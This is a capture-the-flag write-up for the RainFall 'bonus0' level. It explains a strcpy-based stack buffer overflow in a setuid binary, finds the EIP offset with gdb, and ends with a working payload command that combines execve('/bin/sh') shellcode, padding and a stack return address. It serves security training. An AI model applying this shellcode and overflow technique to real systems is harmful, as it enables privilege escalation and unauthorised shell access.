<p align="justify">

Bonus0 protections:
```Shell
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/bonus0/bonus0
```

Bonus0 rights:
```Shell
-rwsr-s---+ 1 bonus1 users 5566 Mar  6  2016 bonus0
```

Testing the binary:
```Shell
bonus0@RainFall:~$ ./bonus0
 - 
test
 - 
truc
test truc
```

Let's decompile it with Hex-Rays on https://dogbolt.org/ and see what is there:
- the code uses `strcpy()`and `strncpy()`, which we can exploit for a buffer overflow
- the resulting string is of size ARG1 + ARG2 + ONE-SPACE + ARG2
- the buffer in `main()`has a size of [42]
While testing the binary, we also realise that:
- arg1 will accept a maximum of 19b and add a `\0`at the end of the string (with `strcpy()`), so if you give it 20b it will continue reading past 20
- the buffers of arg1 and arg2 sit next to each other

We can therefore write a shellcode as a first argument, however ours is 21b. So we can write the first 20b, and start the second argument with 1 byte.

Next, we must find `EIP` to overwrite it. We know that the buffer is [42], so let's try to overflow it with a pattern of 20b as ARG1 and 19b as ARG2. 20 is the maximum you can give to ARG1, and 19 is the maximum without getting weird characters (the size of what we are sending will be 20 + 19 + 19 = 58).

```Shell
(gdb) run
Starting program: /home/user/bonus0/bonus0 
 - 
Aa0Aa1Aa2Aa3Aa4Aa5Aa //20bytes
 - 
Aa0Aa1Aa2Aa3Aa4Aa5A //19bytes
Aa0Aa1Aa2Aa3Aa4Aa5AaAa0Aa1Aa2Aa3Aa4Aa5A Aa0Aa1Aa2Aa3Aa4Aa5A

Program received signal SIGSEGV, Segmentation fault.
0x35614134 in ?? ()
```
This gives us 14. When you take 20(ARG1) + 19(ARG2) + 1(the space added) + 14(SEGFAULT), you get an offset of 54.

Now:




address of s: 0xbffff736
offset: 54 (20(arg1) + 19(fake arg2) + 1(space) + 14(arg2))

payload: 21 bytes of shellcode + 33 bytes of padding + address of s

```Shell
level2@RainFall:~$ (python -c 'print("\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd")'; python -c 'print("\x80" + "A" * 13  + "\xbf\xff\xf7\x36"[::-1] + "A")'; cat -) | ./bonus0
```

</p>